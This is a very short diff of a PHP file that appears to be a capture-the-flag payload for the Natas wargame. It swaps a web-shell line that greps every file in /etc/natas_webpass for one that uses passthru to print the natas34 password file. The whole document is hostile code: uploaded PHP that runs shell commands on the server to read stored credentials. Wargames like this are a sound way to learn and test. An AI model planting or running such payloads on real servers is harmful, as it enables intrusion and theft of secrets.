@@ -1,1 +1,3 @@
-<pre><?php system('grep -i . /etc/natas_webpass/*');?></pre>
+<?php
+passthru('cat /etc/natas_webpass/natas34');
+?>
